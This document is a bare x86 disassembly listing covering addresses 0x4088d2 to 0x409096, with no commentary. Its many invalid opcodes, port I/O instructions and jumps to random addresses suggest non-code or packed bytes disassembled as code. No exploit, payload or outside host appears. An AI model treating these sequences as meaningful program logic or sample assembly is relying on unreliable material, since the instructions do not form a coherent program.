  4088d2:	test   BYTE PTR [ebp+0x6aff0f2a],dh
  4088d8:	push   eax
  4088d9:	clc    
  4088da:	idiv   BYTE PTR [esi+0x30741412]
  4088e0:	add    BYTE PTR [eax],al
  4088e2:	scas   al,BYTE PTR es:[edi]
  4088e3:	shr    bl,1
  4088e5:	mov    dh,0x52
  4088e7:	ltr    WORD PTR ds:0x91bc91bd
  4088ee:	cmp    cl,BYTE PTR [edi]
  4088f0:	(bad)  
  4088f1:	jmp    0xf9a8feb4
  4088f6:	xor    bh,bh
  4088f8:	mov    ebp,0x6acaf00
  4088fd:	call   0x4016a3
  408902:	jmp    FWORD PTR [esp+ebp*8-0x9]
  408906:	fbstp  TBYTE PTR [edx]
  408908:	push   DWORD PTR [ebp+0x60]
  40890b:	cmp    bh,BYTE PTR ds:0xff32ff9b
  408911:	mov    ch,0xf0
  408913:	sub    bh,bh
  408915:	(bad)  
  408916:	jmp    FWORD PTR [esi+eax*1-0x70e018]
  40891d:	(bad)  
  40891e:	jmp    FWORD PTR [eax+eiz*8-0x9]
  408922:	push   DWORD PTR [edx]
  408924:	push   DWORD PTR [ebp-0xd68c]
  40892a:	dec    edi
  40892b:	stos   DWORD PTR es:[edi],eax
  40892c:	push   es
  40892d:	call   0x401761
  408932:	aas    
  408933:	imul   ebx,eax,0xfffffff7
  408936:	aas    
  408937:	xor    edi,edi
  408939:	jne    0x40893b
  40893b:	cmp    cl,BYTE PTR ds:0xff32ff9b
  408941:	mov    ch,0x1c
  408943:	sub    edi,edi
  408945:	inc    DWORD PTR [eax]
  408947:	add    bh,bl
  408949:	lods   al,BYTE PTR ds:[esi]
  40894a:	push   es
  40894b:	call   0x40191f
  408950:	jmp    FWORD PTR [esp+edx*8-0x9]
  408954:	push   DWORD PTR [edx]
  408956:	push   DWORD PTR [ebp-0x30]
  408959:	cmp    ecx,esi
  40895b:	call   0x2af4:0xb5ff32ef
  408962:	(bad)  
  408963:	push   eax
  408965:	cs popf 
  408967:	(bad)  
  408968:	fbstp  TBYTE PTR [edx]
  40896a:	mov    ch,0xec
  40896c:	(bad)  
  40896d:	xor    bh,bh
  40896f:	call   0x3f1e2c
  408974:	xor    DWORD PTR [esi-0x617917a9],esp
  40897a:	and    eax,ebp
  40897c:	mov    WORD PTR [eax+0x22],?
  40897f:	(bad)  
  408980:	jle    0x4089ca
  408982:	aas    
  408983:	div    DWORD PTR [esi-0x7a]
  408986:	sub    ebx,edx
  408988:	int3   
  408989:	jle    0x4089ad
  40898b:	call   FWORD PTR [ebx+edx*2+0x635eff1a]
  408992:	push   edx
  408993:	popf   
  408994:	push   esi
  408995:	data16 and dh,BYTE PTR [ebp-0xdd999b]
  40899c:	pop    ecx
  40899d:	aas    
  40899e:	cmp    bh,0x3e
  4089a1:	dec    esi
  4089a2:	pop    eax
  4089a3:	lock ds inc esi
  4089a6:	and    bh,bh
  4089a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4089a9:	out    dx,eax
  4089aa:	and    DWORD PTR [ebp+0x0],esi
  4089ad:	add    BYTE PTR [ecx],bh
  4089af:	and    ecx,DWORD PTR [edx]
  4089b1:	(bad)  
  4089b2:	push   ds
  4089b3:	and    dh,BYTE PTR cs:[ebp-0xddd1df]
  4089ba:	sbb    DWORD PTR [ebx-0x80],edx
  4089bd:	inc    DWORD PTR [esi]
  4089bf:	push   ss
  4089c0:	enter  0x8f7,0xf2
  4089c4:	and    bh,bh
  4089c6:	test   BYTE PTR ds:0x8d9fb97,0xb1
  4089cd:	jmp    esi
  4089cf:	ret    
  4089d0:	inc    ebp
  4089d1:	or     al,0x31
  4089d3:	dec    eax
  4089d4:	(bad)  
  4089d5:	in     al,dx
  4089d6:	mov    dl,0xbe
  4089d8:	pop    ds
  4089d9:	push   0x31
  4089db:	push   ecx
  4089dc:	add    edi,edi
  4089de:	cmp    al,0x3
  4089e0:	sub    edi,DWORD PTR [edx-0x76df3265]
  4089e6:	ins    BYTE PTR es:[edi],dx
  4089e7:	(bad)  
  4089e8:	stos   DWORD PTR es:[edi],eax
  4089e9:	ret    0x3c6a
  4089ec:	add    al,0xff
  4089ee:	pop    esp
  4089ef:	adc    al,0x45
  4089f1:	jmp    0x4089e4
  4089f3:	adc    ebx,DWORD PTR [esi-0x5703d169]
  4089f9:	pop    ds
  4089fa:	mov    cs,WORD PTR [ecx+eax*1]
  4089fd:	inc    ebp
  4089fe:	dec    edx
  4089ff:	push   ebx
  408a00:	jmp    0xe954bab0
  408a05:	xor    DWORD PTR [esi-0x7a],0xffffffe1
  408a09:	sub    ebx,DWORD PTR [edi+0x66216e0e]
  408a0f:	xchg   BYTE PTR [ebp+0x21],ah
  408a12:	add    BYTE PTR [eax],al
  408a14:	in     al,0x1b
  408a16:	push   ecx
  408a17:	dec    edi
  408a18:	mov    ebx,0x734b560c
  408a1d:	pop    ss
  408a1e:	jmp    0x6a4045d9
  408a23:	dec    eax
  408a24:	cmp    eax,0x36ad9665
  408a29:	jp     0x408a34
  408a2b:	and    DWORD PTR [esp+ebx*1+0xbc8b141],esp
  408a32:	mov    esi,DWORD PTR es:[eax+ecx*1+0x72]
  408a37:	xlat   BYTE PTR ds:[ebx]
  408a38:	popf   
  408a39:	cmp    al,0xa8
  408a3b:	add    edi,DWORD PTR [edx+0x71eb9049]
  408a41:	adc    al,0x69
  408a43:	loope  0x408a43
  408a45:	xchg   DWORD PTR [eax-0x57b7de55],ecx
  408a4b:	add    eax,DWORD PTR [edi-0x194ecb04]
  408a51:	or     edi,DWORD PTR [ecx]
  408a53:	lods   al,BYTE PTR ds:[esi]
  408a54:	xor    eax,0x7e042848
  408a59:	cld    
  408a5a:	xor    BYTE PTR [eax+0xd330bce],0xf1
  408a61:	sub    ebp,0x1380e30c
  408a67:	mov    edx,0x8effd2ce
  408a6c:	push   ecx
  408a6d:	or     ebp,DWORD PTR [eax-0x34]
  408a70:	xchg   BYTE PTR [eax+eax*1+0x39],dl
  408a74:	dec    ebp
  408a75:	icebp  
  408a76:	lahf   
  408a77:	sahf   
  408a78:	add    BYTE PTR [eax],al
  408a7a:	push   ecx
  408a7b:	fs push 0xbdfb32e9
  408a81:	add    DWORD PTR [ebp-0x3d16beb1],eax
  408a87:	or     dh,BYTE PTR [ebp-0xf]
  408a8a:	dec    edx
  408a8b:	mov    ecx,0xfc1176c0
  408a90:	fmul   DWORD PTR [ebp+0x11]
  408a93:	or     ebp,ebx
  408a95:	call   0xe97f1602
  408a9a:	mov    edi,0x6555460d
  408a9f:	retf   
  408aa0:	mov    eax,0xff0b114e
  408aa5:	cmp    eax,eax
  408aa7:	dec    ebx
  408aa8:	pop    es
  408aa9:	mov    ah,0xb1
  408aab:	or     esi,DWORD PTR [ebp+0x35]
  408aae:	push   ecx
  408aaf:	or     DWORD PTR [eax],0xfeacff41
  408ab5:	es icebp 
  408ab7:	push   0x142e2bc9
  408abc:	push   ebp
  408abd:	bound  ebx,QWORD PTR [esi-0x69]
  408ac0:	ret    
  408ac1:	or     eax,0x60c8151
  408ac6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ac7:	adc    ch,al
  408ac9:	lds    edi,FWORD PTR [ecx+0xb]
  408acc:	jmp    DWORD PTR [eax-0x9]
  408acf:	push   cs
  408ad0:	push   DWORD PTR [esi+eax*2+0xb]
  408ad4:	jne    0x408ac7
  408ad6:	or     ah,BYTE PTR [eax-0x60c9216d]
  408adc:	dec    esp
  408add:	in     eax,0x0
  408adf:	add    BYTE PTR [ebx],bh
  408ae1:	aam    0x73
  408ae3:	sub    esi,DWORD PTR [edx-0x3ffffb4]
  408ae9:	hlt    
  408aea:	std    
  408aeb:	jne    0x408b61
  408aed:	aaa    
  408aee:	xchg   ebp,eax
  408aef:	pushf  
  408af0:	out    0x2a,eax
  408af2:	push   eax
  408af3:	call   FWORD PTR [ebp+0x24]
  408af6:	push   DWORD PTR [ebp-0x2c]
  408af9:	mov    edi,0x3ea075fd
  408afe:	int3   
  408aff:	xchg   esi,eax
  408b00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b01:	sub    bl,BYTE PTR [edx-0x75]
  408b04:	and    eax,0x88398324
  408b09:	stos   DWORD PTR es:[edi],eax
  408b0a:	or     BYTE PTR [edx-0x60],dl
  408b0d:	retf   0xff9a
  408b10:	out    0xfe,eax
  408b12:	mov    esi,0x7c957ceb
  408b17:	adc    BYTE PTR [eax-0x5e],cl
  408b1a:	push   es
  408b1b:	mov    ecx,DWORD PTR [ebp-0x1b8a01fa]
  408b21:	call   0x2b02:0x3f1a8aff
  408b28:	or     BYTE PTR [ecx-0x3e],bl
  408b2b:	or     al,0x48
  408b2d:	retf   
  408b2e:	mov    esp,ebp
  408b30:	stos   DWORD PTR es:[di],eax
  408b32:	or     bh,bh
  408b34:	fstp   QWORD PTR ds:0x299eb9e8
  408b3a:	(bad)  
  408b3b:	(bad)  
  408b3c:	mov    ebp,0xadff5019
  408b41:	sbb    eax,0x31e8
  408b46:	jg     0x408b71
  408b48:	dec    ecx
  408b4a:	dec    edx
  408b4b:	sbb    BYTE PTR [eax],al
  408b4d:	push   ebp
  408b4e:	add    DWORD PTR [ebx+eax*4-0x3c],0x18
  408b53:	ret    0x5355
  408b56:	pop    ebx
  408b57:	mov    bl,0x6
  408b59:	add    BYTE PTR [esi+eax*1-0x7e],bh
  408b5d:	jge    0x408b23
  408b5f:	adc    eax,0x7e310c74
  408b64:	mov    al,ds:0x65f310f
  408b69:	cmp    DWORD PTR [edi+eiz*8],0x2
  408b6d:	jne    0x408b97
  408b6f:	es inc esp
  408b71:	pop    ebx
  408b72:	push   cs
  408b73:	and    DWORD PTR [ebp-0x3e],ecx
  408b76:	inc    ecx
  408b77:	sti    
  408b78:	mov    DWORD PTR [ebp+0x2d],eax
  408b7b:	jle    0x408ba0
  408b7d:	pop    es
  408b7e:	mov    dl,0x28
  408b80:	adc    BYTE PTR [eax],al
  408b82:	add    eax,0xfdc009f7
  408b87:	repz jmp 0xbe72664c
  408b8d:	enter  0xeb73,0x2
  408b91:	mov    esi,esp
  408b93:	out    0x81,al
  408b95:	loopne 0x408bc5
  408b97:	jle    0x408b39
  408b99:	adc    esi,DWORD PTR [ecx]
  408b9b:	out    0x6,eax
  408b9d:	or     esi,DWORD PTR [ecx-0x21]
  408ba0:	or     ebp,DWORD PTR [ebx]
  408ba2:	jno    0x408b6a
  408ba4:	mov    ebp,0xf33d785d
  408ba9:	inc    DWORD PTR [eax]
  408bab:	add    BYTE PTR [ebx],cl
  408bad:	ss push ds
  408baf:	jne    0x408bd6
  408bb1:	jp     0x408b7b
  408bb3:	mov    edi,0xb42b7b2
  408bb8:	rol    BYTE PTR es:[edx-0x18],0xed
  408bbd:	xchg   ebp,eax
  408bbe:	sbb    eax,0xc88415ff
  408bc3:	ret    
  408bc4:	mov    edx,0x4ebe469f
  408bc9:	xlat   BYTE PTR ds:[ebx]
  408bca:	ret    
  408bcb:	(bad)  
  408bcc:	mov    ecx,0x31000305
  408bd1:	push   cs
  408bd2:	mov    sp,WORD PTR [ebx+esi*8-0x77]
  408bd7:	dec    ebp
  408bd8:	xor    eax,0x748d660e
  408bdd:	adc    al,0xd9
  408bdf:	mov    ah,0xd7
  408be1:	jle    0x408b8c
  408be3:	sbb    eax,0x44c0d044
  408be8:	mov    WORD PTR [eax],cs
  408bea:	into   
  408beb:	sbb    eax,0x81d0d044
  408bf0:	call   0x6618:0x241dbe08
  408bf7:	(bad)  
  408bf8:	out    0x94,al
  408bfa:	and    eax,DWORD PTR [edx+edi*1+0x9]
  408bfe:	sbb    al,0x44
  408c00:	mov    DWORD PTR [ebx-0x6571e27f],ebx
  408c06:	sub    ecx,DWORD PTR [eax-0x7b]
  408c09:	call   0x8979:0x7eac4823
  408c10:	add    BYTE PTR [eax],al
  408c12:	hlt    
  408c13:	iret   
  408c14:	aas    
  408c15:	hlt    
  408c16:	outs   dx,BYTE PTR ds:[esi]
  408c17:	or     cl,ch
  408c19:	adc    BYTE PTR [ebp-0xe203a37],cl
  408c1f:	adc    esp,DWORD PTR [eax-0x16ebcef7]
  408c25:	adc    BYTE PTR [ebp-0x45f42464],dl
  408c2b:	push   esi
  408c2c:	fst    QWORD PTR [eax]
  408c2e:	xchg   ebp,eax
  408c2f:	xchg   esi,eax
  408c30:	stos   DWORD PTR es:[edi],eax
  408c31:	and    esp,ecx
  408c33:	or     BYTE PTR [ebx+eax*2+0x2c2d822e],dh
  408c3a:	xchg   esi,eax
  408c3b:	mov    cl,0x2d
  408c3d:	sbb    eax,0x2c2d821e
  408c42:	arpl   WORD PTR [ebx-0x65f2e2e3],bp
  408c48:	fwait
  408c49:	adc    esi,DWORD PTR [ecx+ecx*4+0x14215b21]
  408c50:	jmp    0x6bf18e58
  408c55:	xchg   edi,eax
  408c56:	push   cs
  408c57:	into   
  408c58:	jmp    eax
  408c5a:	xor    dl,BYTE PTR [eax+eax*1]
  408c5d:	cli    
  408c5e:	push   esi
  408c5f:	jp     0x408c62
  408c61:	je     0x408c52
  408c63:	iret   
  408c64:	dec    edi
  408c65:	rcr    DWORD PTR [eax],1
  408c67:	cwde   
  408c68:	(bad)  
  408c69:	call   0x62510e27
  408c6e:	lahf   
  408c6f:	and    eax,ecx
  408c71:	(bad)  
  408c72:	xor    DWORD PTR [ebx],ebx
  408c74:	push   DWORD PTR ds:0xfad40000
  408c7a:	push   cs
  408c7b:	outs   dx,DWORD PTR fs:[esi]
  408c7d:	out    dx,eax
  408c7e:	dec    edi
  408c7f:	pop    ss
  408c80:	out    0xef,eax
  408c82:	jp     0x408cfa
  408c84:	xor    dl,BYTE PTR [ebx+eax*4]
  408c87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c88:	cmp    dl,BYTE PTR [edi+0xb]
  408c8b:	xchg   esi,eax
  408c8c:	lahf   
  408c8d:	clc    
  408c8e:	push   cs
  408c8f:	push   edi
  408c90:	je     0x408c98
  408c92:	add    DWORD PTR [ecx-0x2dfd80d6],0x42
  408c99:	cmp    esi,DWORD PTR [ebp-0x27]
  408c9c:	and    esi,esi
  408c9e:	imul   ebp,ecx,0xe9690788
  408ca4:	mov    BYTE PTR [edi],al
  408ca6:	push   ebp
  408ca7:	pop    esi
  408ca8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ca9:	pop    ss
  408caa:	push   0xffffffe9
  408cac:	cwde   
  408cad:	pop    es
  408cae:	out    0xf,eax
  408cb0:	add    DWORD PTR [edi],0x7ff2f2ff
  408cb6:	sub    DWORD PTR [ecx+0x53d3eee2],ebx
  408cbc:	inc    ebp
  408cbd:	pop    es
  408cbe:	mov    edx,DWORD PTR [ecx]
  408cc0:	fstp   TBYTE PTR [eax+eax*1-0x6d]
  408cc4:	xor    ah,BYTE PTR [ebp+0x53]
  408cc7:	mov    bh,0x2d
  408cc9:	adc    DWORD PTR [eax],0x7a3283
  408ccf:	add    edi,edi
  408cd1:	jp     0x408cd3
  408cd3:	add    BYTE PTR [eax],cl
  408cd5:	sbb    al,0xc0
  408cd7:	jne    0x408cb9
  408cd9:	ret    
  408cda:	out    0x9d,al
  408cdc:	add    BYTE PTR [eax],al
  408cde:	sub    BYTE PTR [eax],0xff
  408ce1:	sub    eax,DWORD PTR [ebx-0x64]
  408ce4:	ret    0x6f5b
  408ce7:	retf   0xc2c7
  408cea:	enter  0x5512,0x8b
  408cee:	in     al,dx
  408cef:	mov    es,ebx
  408cf1:	lock pop es
  408cf3:	mov    edi,0xa4efdb29
  408cf8:	or     bh,bh
  408cfa:	gs sbb al,ch
  408cfd:	add    DWORD PTR ds:0xcf50ff2b,eax
  408d03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d04:	push   es
  408d05:	call   0x400f00
  408d0a:	add    ebp,DWORD PTR [eax]
  408d0c:	pop    eax
  408d0d:	add    esp,DWORD PTR [eax+0x5774c016]
  408d13:	popf   
  408d14:	inc    esp
  408d15:	hlt    
  408d16:	sbb    BYTE PTR [ebx],ch
  408d18:	jne    0x408d26
  408d1a:	out    dx,eax
  408d1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d1c:	push   es
  408d1d:	call   0x3fba15
  408d22:	rcl    esp,1
  408d24:	cli    
  408d25:	lea    eax,[ebp+0x65ff5022]
  408d2b:	push   cs
  408d2c:	push   DWORD PTR [ebp+0x50]
  408d2f:	cmp    bl,BYTE PTR [ecx-0x76d51003]
  408d35:	inc    ebp
  408d36:	lock sub dh,BYTE PTR [ebp-0x10]
  408d3a:	outs   dx,DWORD PTR ds:[esi]
  408d3b:	mov    ds:0x15e5fff6,eax
  408d40:	push   DWORD PTR [ebp+0x0]
  408d43:	add    BYTE PTR [eax+edi*1+0x11],cl
  408d47:	dec    BYTE PTR [edi+0x29]
  408d4a:	mov    ebx,eax
  408d4c:	das    
  408d4d:	mov    ds:0xcf31e8fa,eax
  408d52:	jl     0x408d53
  408d54:	(bad)  
  408d55:	push   ss
  408d56:	xchg   ecx,eax
  408d57:	test   DWORD PTR [ecx],0xeeff7cd8
  408d5d:	mov    eax,ds:0x88e65702
  408d62:	or     ebp,eax
  408d64:	mov    DWORD PTR [ebx+ebx*1-0x1],ebp
  408d68:	stos   BYTE PTR es:[edi],al
  408d69:	mov    edx,0xb9f85ebd
  408d6e:	or     al,BYTE PTR [eax]
  408d70:	pop    esp
  408d71:	jb     0x408d9a
  408d73:	cmp    DWORD PTR [edi+eiz*8],0x0
  408d77:	jb     0x408d89
  408d79:	into   
  408d7a:	(bad)  
  408d7b:	fxsave [eax+0xc]
  408d7f:	call   0xff5af534
  408d84:	sahf   
  408d85:	inc    eax
  408d86:	hlt    
  408d87:	(bad)  
  408d88:	sbb    al,0x3
  408d8a:	sub    ebp,DWORD PTR [edi-0xe65974]
  408d90:	cld    
  408d91:	or     bl,BYTE PTR [edx]
  408d93:	jne    0x408dbe
  408d95:	xchg   ebx,eax
  408d96:	pop    esi
  408d97:	std    
  408d98:	jbe    0x408d28
  408d9a:	sbb    DWORD PTR [ebp+0x41],esi
  408d9d:	xchg   BYTE PTR [eax+0x1b315907],dl
  408da3:	call   FWORD PTR [esi+0x72]
  408da6:	mov    al,0x13
  408da8:	add    BYTE PTR [eax],al
  408daa:	test   al,0xf9
  408dac:	sbb    DWORD PTR [ebp+0x21],esi
  408daf:	xchg   ax,ax
  408db1:	pop    es
  408db2:	pop    ecx
  408db3:	je     0x408dcd
  408db5:	(bad)  
  408db6:	ds jp  0x408d51
  408db9:	or     esi,DWORD PTR [edx]
  408dbb:	(bad)
  408dbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408dbf:	jmp    0x408dda
  408dc1:	jne    0x408dfc
  408dc3:	push   ebx
  408dc4:	fwait
  408dc5:	cld    
  408dc6:	push   ds
  408dc7:	sbb    dh,BYTE PTR ss:[ebp+0x41]
  408dcb:	adc    al,0x26
  408dcd:	nop
  408dce:	ss cld 
  408dd0:	mov    ebx,DWORD PTR [eax]
  408dd2:	push   es
  408dd3:	add    eax,0x7a2e9016
  408dd8:	icebp  
  408dd9:	sbb    bh,BYTE PTR [esp+ebx*1+0x11]
  408ddd:	outs   dx,BYTE PTR ds:[esi]
  408dde:	lds    eax,FWORD PTR [esi+edi*8]
  408de1:	sbb    DWORD PTR [esp-0xa],ebx
  408de5:	(bad)  
  408de6:	ss cld 
  408de8:	int3   
  408de9:	outs   dx,DWORD PTR ds:[esi]
  408dea:	(bad)  
  408deb:	add    al,0xb0
  408ded:	inc    esi
  408dee:	and    DWORD PTR [esp+esi*1],edx
  408df1:	(bad)  
  408df2:	aad    0x4
  408df4:	pop    esp
  408df5:	or     BYTE PTR [ebx+0x13],cl
  408df8:	into   
  408df9:	(bad)  
  408dfa:	cs cld 
  408dfc:	je     0x408e6e
  408dfe:	scas   al,BYTE PTR es:[edi]
  408dff:	add    al,0xbe
  408e01:	(bad)  
  408e02:	cmp    al,BYTE PTR ds:0xec890c3c
  408e08:	scas   al,BYTE PTR es:[edi]
  408e09:	sbb    DWORD PTR [esi+0xf43b98],edx
  408e0f:	add    BYTE PTR [ecx+0x3a8f9e11],bh
  408e15:	add    eax,0xdc890c1c
  408e1a:	mov    ds,WORD PTR [ecx]
  408e1c:	jbe    0x408db6
  408e1e:	sbb    esi,eax
  408e20:	mov    ecx,0x3a8f7e11
  408e25:	add    eax,0xcc490bfc
  408e2a:	outs   dx,BYTE PTR ds:[esi]
  408e2b:	sbb    DWORD PTR [esi-0x68],edx
  408e2e:	mov    ebx,0x3011b9fb
  408e33:	inc    esi
  408e34:	sbb    eax,0x4d8cbc14
  408e39:	nop
  408e3a:	and    al,0x28
  408e3c:	fistp  WORD PTR [esi+eax*2-0x71]
  408e40:	inc    edx
  408e41:	outs   dx,BYTE PTR ds:[esi]
  408e42:	call   0x4d2a5f
  408e47:	inc    ecx
  408e48:	hlt    
  408e49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e4a:	(bad)  
  408e4b:	cmp    BYTE PTR cs:[ecx+0x1bbe2614],cl
  408e52:	call   0xff440aac
  408e57:	bound  esp,QWORD PTR ds:0x32e83aed
  408e5d:	adc    al,0x8b
  408e5f:	lods   al,BYTE PTR ds:[esi]
  408e60:	ficom  WORD PTR [esi+0x18b7e937]
  408e66:	jmp    0x54c22a
  408e6b:	es xchg esi,eax
  408e6d:	(bad)  
  408e6e:	(bad)  
  408e6f:	call   0x24cda2a6
  408e74:	add    BYTE PTR [eax],al
  408e76:	sub    DWORD PTR [edi+edi*8+0x5c],esp
  408e7a:	rol    DWORD PTR [edx],0x75
  408e7d:	stc    
  408e7e:	sbb    DWORD PTR [ecx+0x244d108],ecx
  408e84:	(bad)  
  408e85:	mov    esi,0x3482fcb5
  408e8a:	cmp    DWORD PTR [esp+esi*2],edx
  408e8d:	or     al,ch
  408e8f:	inc    ebp
  408e90:	cmp    al,0x28
  408e92:	xor    eax,0x5a9d7503
  408e97:	mov    gs,WORD PTR [edx-0x17]
  408e9a:	xor    cl,BYTE PTR [edi]
  408e9c:	rcl    BYTE PTR [esi+ebp*1],0x6c
  408ea0:	cmp    al,ch
  408ea2:	jae    0x408ea7
  408ea4:	(bad)  
  408ea5:	hlt    
  408ea6:	ds in  al,dx
  408ea8:	js     0x408eac
  408eaa:	xor    eax,0x9248914
  408eaf:	out    dx,eax
  408eb0:	push   es
  408eb1:	cs (bad) 
  408eb3:	out    dx,eax
  408eb4:	(bad)  
  408eb5:	call   0xd4c3a2ec
  408eba:	push   ss
  408ebb:	adc    al,0x74
  408ebd:	icebp  
  408ebe:	mov    dl,BYTE PTR [eax+eax*1]
  408ec1:	add    BYTE PTR [edi+0x1475ff5d],al
  408ec7:	das    
  408ec8:	inc    edi
  408ec9:	xchg   ebp,eax
  408eca:	addr16 sbb al,0xff
  408ecd:	jne    0x408f13
  408ecf:	sbb    al,0x75
  408ed1:	or     al,0x20
  408ed3:	jge    0x408e6a
  408ed5:	jmp    DWORD PTR [edi]
  408ed7:	mov    eax,DWORD PTR cs:[eax]
  408eda:	add    BYTE PTR [eax],al
  408edc:	or     BYTE PTR [edi],dl
  408ede:	mov    eax,DWORD PTR [ebp-0x4]
  408ee1:	xchg   edi,eax
  408ee2:	aaa    
  408ee3:	add    BYTE PTR [ebp+0x2],ch
  408ee6:	call   0x576771
  408eeb:	(bad)  
  408eec:	lea    ebx,[esi]
  408eee:	add    BYTE PTR [eax],al
  408ef0:	enter  0xc716,0x45
  408ef4:	in     al,dx
  408ef5:	pop    ss
  408ef6:	add    BYTE PTR [eax],al
  408ef8:	fadd   DWORD PTR [ecx+0x45]
  408efb:	lock enter 0x16,0x0
  408f00:	push   ebp
  408f01:	aad    0xee
  408f03:	push   eax
  408f04:	and    eax,0x1550f2d5
  408f09:	aad    0xf6
  408f0b:	push   eax
  408f0c:	out    0xa4,eax
  408f0e:	adc    bh,bh
  408f10:	pop    ebp
  408f11:	adc    al,ch
  408f13:	loope  0x408eeb
  408f15:	sub    bh,bh
  408f17:	and    DWORD PTR ds:0x5b74002c,0xffffff95
  408f1e:	jl     0x408f18
  408f20:	mov    BYTE PTR [edx+0x2435832b],dl
  408f26:	add    BYTE PTR [ebp+0x4e],dh
  408f29:	xchg   ebp,eax
  408f2a:	jl     0x408f1c
  408f2c:	dec    eax
  408f2d:	xchg   edx,eax
  408f2e:	pop    ds
  408f2f:	call   FWORD PTR [ebp+0x1e]
  408f32:	push   DWORD PTR [ebp+0x44]
  408f35:	cs cmp eax,0xff2ae795
  408f3b:	jne    0x408f6e
  408f3d:	popa   
  408f3e:	pop    ss
  408f3f:	jne    0x408f41
  408f41:	add    BYTE PTR ds:0x2e94d255,ah
  408f47:	pop    ebx
  408f48:	pop    ss
  408f49:	jne    0x408f6c
  408f4b:	inc    ebx
  408f4c:	xchg   ecx,eax
  408f4d:	or     ecx,DWORD PTR [ecx]
  408f4f:	adc    esi,DWORD PTR [ecx-0x1]
  408f52:	push   ss
  408f53:	xor    edx,DWORD PTR [ecx+0x7ae019f7]
  408f59:	inc    DWORD PTR [esi]
  408f5b:	and    edx,DWORD PTR [ecx+0x7ad809f3]
  408f61:	push   esi
  408f63:	adc    dl,BYTE PTR [ecx+0x7acfd9ef]
  408f69:	jmp    esi
  408f6b:	mov    dl,0x9
  408f6d:	jmp    FWORD PTR [esi]
  408f6f:	jo     0x408f1a
  408f71:	(bad)  
  408f72:	(bad)  
  408f73:	repnz cmp DWORD PTR [ebp-0x23],0x5b1d8eeb
  408f7b:	jmp    0x408f92
  408f7d:	jne    0x408fac
  408f7f:	shr    DWORD PTR [esi-0x6c],cl
  408f82:	mov    dh,0xd2
  408f84:	test   al,0xff
  408f86:	scas   eax,DWORD PTR es:[edi]
  408f87:	inc    eax
  408f88:	or     al,ch
  408f8a:	mov    ebx,0xbff1667
  408f8f:	jmp    0x408fa6
  408f91:	jne    0x408fb8
  408f93:	rol    DWORD PTR [edx+0x15ba8e94],cl
  408f99:	jne    0x408f20
  408f9b:	mov    ds:0xaa7e9725,eax
  408fa0:	les    ecx,FWORD PTR [edx]
  408fa2:	jg     0x408f86
  408fa4:	jg     0x408f63
  408fa6:	add    BYTE PTR [eax],al
  408fa8:	outs   dx,DWORD PTR ds:[esi]
  408fa9:	call   0x1040:0xc4075f15
  408fb0:	xor    DWORD PTR [eax],esp
  408fb2:	mov    ebp,esp
  408fb4:	mov    dl,0xb7
  408fb6:	push   ds
  408fb7:	push   esi
  408fb8:	dec    esi
  408fb9:	adc    al,0xdc
  408fbb:	or     ebx,DWORD PTR [ecx-0x57]
  408fbe:	ins    DWORD PTR es:[edi],dx
  408fbf:	push   ss
  408fc0:	mov    ebp,DWORD PTR ds:[ebx+0x557fb20f]
  408fc7:	repz mov ds:0x3104810e,eax
  408fcd:	adc    al,0xe9
  408fcf:	mov    ch,0xe9
  408fd1:	aad    0xe0
  408fd3:	add    edx,DWORD PTR [esi]
  408fd5:	xchg   ecx,esp
  408fd7:	sub    ebp,DWORD PTR [edx+eiz*4+0x56ee1625]
  408fde:	and    DWORD PTR [ecx+esi*1],eax
  408fe1:	adc    al,0xe9
  408fe3:	mov    BYTE PTR [esp+edi*8-0x48],ch
  408fe7:	push   ss
  408fe8:	fs or  al,0x11
  408feb:	faddp  st(0),st
  408fed:	add    dh,bh
  408fef:	mov    esi,DWORD PTR [eax+eax*1+0x6a]
  408ff3:	cwde   
  408ff4:	ficom  WORD PTR [ebx]
  408ff6:	jne    0x408fff
  408ff8:	mov    dl,0x7e
  408ffa:	in     eax,0x2
  408ffc:	inc    ebx
  408ffd:	sbb    ch,BYTE PTR [edx-0x69]
  409000:	mov    edx,0x790a5f19
  409005:	adc    ch,cl
  409007:	add    esi,DWORD PTR [ecx]
  409009:	bound  esi,QWORD PTR [eax+0x39000042]
  40900f:	adc    al,0x6c
  409011:	mov    edi,0x8fb663a6
  409016:	cs in  al,dx
  409018:	lods   al,BYTE PTR ds:[esi]
  409019:	jae    0x408fa9
  40901b:	add    BYTE PTR [edx-0x69],ch
  40901e:	jle    0x409033
  409020:	adc    eax,0x1cd42a00
  409025:	or     bh,BYTE PTR [ecx+0x3103e912]
  40902b:	bound  esi,QWORD PTR [eax+0x6a143942]
  409031:	xchg   edi,eax
  409032:	pop    edx
  409033:	push   ss
  409034:	add    bl,bh
  409036:	pop    ebp
  409037:	pop    DWORD PTR [ecx+esi*2-0x7b]
  40903b:	push   0x18
  40903d:	data16 mov dh,0x18
  409040:	call   0xff415106
  409045:	fs jbe 0x409050
  409048:	push   eax
  409049:	dec    esi
  40904a:	mov    esi,0xa231e817
  40904f:	(bad)  
  409050:	(bad)  
  409051:	jo     0x409031
  409053:	repz jmp 0x2599:0xf859afd4
  40905b:	mov    DWORD PTR [eax],ecx
  40905d:	adc    DWORD PTR [ebp+eiz*4-0x2],esi
  409061:	push   ds
  409062:	stos   BYTE PTR es:[edi],al
  409063:	pop    ecx
  409064:	in     al,0x64
  409066:	mov    dh,0x7
  409068:	push   eax
  409069:	sub    esi,0xfffffffe
  40906c:	je     0x40905f
  40906e:	sbb    ch,BYTE PTR [edx]
  409070:	xchg   edx,eax
  409071:	inc    BYTE PTR [eax]
  409073:	add    BYTE PTR [ebp-0x6f],al
  409076:	inc    esp
  409077:	icebp  
  409078:	mov    ds:0x1ae174fe,al
  40907d:	jecxz  0x409078
  40907f:	out    0x1d,al
  409081:	xchg   ebx,eax
  409082:	jl     0x409049
  409084:	xor    ecx,DWORD PTR [ecx+0x777641e]
  40908a:	push   eax
  40908b:	into   
  40908c:	mov    edi,0x393cfefb
  409091:	push   DWORD PTR [ecx+esi*8+0x4a]
  409095:	scas   al,BYTE PTR es:[edi]
  409096:	cld    
